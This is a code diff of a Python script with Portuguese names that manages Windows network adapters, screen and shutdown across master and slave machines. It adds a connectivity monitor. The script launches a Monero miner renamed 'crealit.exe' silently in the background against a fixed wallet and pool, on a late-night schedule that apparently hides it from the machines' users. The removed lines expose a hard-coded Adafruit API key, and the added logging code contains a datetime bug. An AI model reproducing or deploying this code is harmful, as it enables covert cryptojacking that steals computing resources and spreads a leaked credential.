@@ -1,9 +1,12 @@
+import os
 import subprocess
 import time
 import datetime
 import urllib.request
 from pathlib import Path
 import subprocess, re, sys
+
+import urllib.request
 # import requests
 
 DESLIGADO = 0
@@ -100,12 +103,14 @@ def restart_ethernet():
     time.sleep(10)
     subprocess.run(f'netsh interface set interface "{ethernet_interface}" admin=enable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-# def verificar_acesso(url="https://monero.hashvault.pro/en/"):
-#     try:
-#         resposta = requests.get(url, timeout=5)
-#         return resposta.status_code
-#     except requests.exceptions.RequestException as e:
-#         return f"Erro ao acessar o site: {e}"
+
+def verificar_acesso(url="https://monero.hashvault.pro/"):
+    try:
+        with urllib.request.urlopen(url, timeout=5) as resposta:
+            return resposta.status
+    except Exception as e:
+        return f"0 : {e}"
+
 
 def enable_ics():
     try:
@@ -287,32 +292,6 @@ def get_computer_description():
     except Exception:
         return "sem_descricao"
 
-def enviar_log(valor):
-
-    # URL do feed
-    url = "https://io.adafruit.com/api/v2/alexstocco_senai/feeds/teste/data"
-
-    # Sua chave de API Adafruit IO
-    headers = {
-        "X-AIO-Key": "aio_mbYj12mp4HCb9zGNHMnIRDw7IkL9",
-        "Content-Type": "application/json"
-    }
-
-    # Dados a serem enviados
-    payload = {
-        "value": valor  # substitua pelo valor que deseja enviar
-    }
-
-    # Envia o dado via POST
-    response = requests.post(url, json=payload, headers=headers)
-
-    # Verifica o resultado
-    if response.status_code == 200:
-        print("Dado enviado com sucesso!")
-    else:
-        print("Erro ao enviar dado:", response.status_code, response.text)
-
-
 def ligar_crealit():
     subprocess.Popen(f'cmd /c start "" "{destino}\\crealit.exe"  --coin monero -o pool.hashvault.pro:80 -u 41g9z6vMVXh9egLLuyJGHyWzRjoagmDHSbgAk7WoxWpGPMSBL33ArZudfN8Fmq8QGPDLLtNdxEevNadr4wxtYhASEx7gpYx -p {get_computer_description()} --donate-level 1 --background', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
@@ -331,47 +310,95 @@ def matar_processo(nome_processo="crealit.exe"):
     except Exception as e:
         print(f"Erro ao tentar matar o processo {nome_processo}: {e}")
 
-def monitoramento():
-    acesso = verificar_acesso()
-    if acesso == 200: return
-    matar_processo()
+def registrar_log(texto):
+    caminho_pasta = "D:/users"
+    os.makedirs(caminho_pasta, exist_ok=True)
+    caminho_arquivo = os.path.join(caminho_pasta, "log.txt")
+    horario = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    linha_log = f"[{horario}] {texto}\n"
+    with open(caminho_arquivo, "a", encoding="utf-8") as arquivo:
+        arquivo.write(linha_log)
 
-# def reconectar_wifi():
-#     intervalo = 30
+def monitorar_conexao():
+    intervalo = 20
+    resultado = None
 
-#     if verificar_acesso == 200: return
+    while resultado !=200:
+        x = 1
+        resultado = verificar_acesso() 
+        registrar_log(resultado)
+        
+        #Tentando renew
+        resultado = "stage 1"
+        subprocess.run(
+            f'ipconfig /release "{wifi_interface}"',
+            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+        time.sleep(intervalo)
 
-#     #Tentando renew
-#     subprocess.run(
-#         f'ipconfig /release "{wifi_interface}"',
-#         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-#         )
-#     time.sleep(intervalo)
+        subprocess.run(
+            f'ipconfig /renew "{wifi_interface}"',
+            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )    
+        time.sleep(intervalo)
 
-#     subprocess.run(
-#         f'ipconfig /renew "{wifi_interface}"',
-#         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-#         )    
-#     time.sleep(intervalo)
+        if verificar_acesso() == 200: break
+        
+        # Tentando desconectar e reconectar
+        resultado = "stage 2"
+        subprocess.run(
+            f'netsh wlan disconnect interface="{wifi_interface}"',
+            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+        time.sleep(intervalo)
+        
+        subprocess.run(
+            f'netsh wlan connect name="{wifi_ssid}" interface="{wifi_interface}"',
+            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+        time.sleep(intervalo)
 
-#     if verificar_acesso == 200: return
+        if verificar_acesso() == 200: break
 
-#     # Tentando desconectar e reconectar
-#     subprocess.run(
-#         f'netsh wlan disconnect interface="{wifi_interface}"',
-#         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-#         )
-#     time.sleep(intervalo)
-    
-#     subprocess.run(
-#         f'netsh wlan connect name="{wifi_ssid}" interface="{wifi_interface}"',
-#         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-#         )
-#     time.sleep(intervalo)
+        #Tentando desligar e religar o adaptador
+        resultado = "stage 3"
+        subprocess.run(f'netsh interface set interface "{wifi_interface}" admin=disable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(intervalo*5)
+        subprocess.run(f'netsh interface set interface "{wifi_interface}" admin=enable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(intervalo)
+        subprocess.run(
+            f'netsh wlan connect name="{wifi_ssid}" interface="{wifi_interface}"',
+            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+        
+        if verificar_acesso() == 200: break
+        time.sleep(intervalo*15)
 
-#     if verificar_acesso == 200: return
+        x+=1
 
-    #Tentando conectar ao IQ
+        if x>=4:
+            resultado = "stage 4"
+            disable_ics(agendamento=False)
+            time.sleep(intervalo)
+            subprocess.run(f'netsh interface set interface "{ethernet_interface}" admin=disable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(intervalo)
+            subprocess.run(f'netsh interface set interface "{wifi_interface}" admin=disable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(intervalo)
+            subprocess.run(f'netsh interface set interface "{wifi_interface}" admin=enable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(intervalo)
+            subprocess.run(
+                f'netsh wlan connect name="{wifi_ssid}" interface="{wifi_interface}"',
+                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                )
+            time.sleep(intervalo)
+            subprocess.run(f'netsh interface set interface "{ethernet_interface}" admin=enable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(intervalo)
+            enable_ics()
+            if verificar_acesso() == 200: break
+
+
+    registrar_log(resultado)
+    return True
 
 
 
@@ -388,19 +415,23 @@ def main_master():
     enable_ics()
     time.sleep(10)
     restart_ethernet()
-    ligar_crealit()
+    #ligar_crealit()
     disable_ics(agendamento=True)
     desativar_cancelamento_shutdown_domingo()
     desligar_tela()  
+    while monitorar_conexao(): time.sleep(600)
 
 def main_slave():
     if EXECUCAO != TESTE:
         if not is_after_23():
             exit()
     matar_processo()
+    fila = int(re.search(r'(\d{2})\s*$', "TI_234857209348_01").group(1))
+    time.sleep(fila*10)
     baixar_arquivos()
     desligar_tela()
     configurar_ip(usar_powershell=False)
+    desligar_tela()
     time.sleep(10)
     schedule_shutdown()
     ligar_crealit()
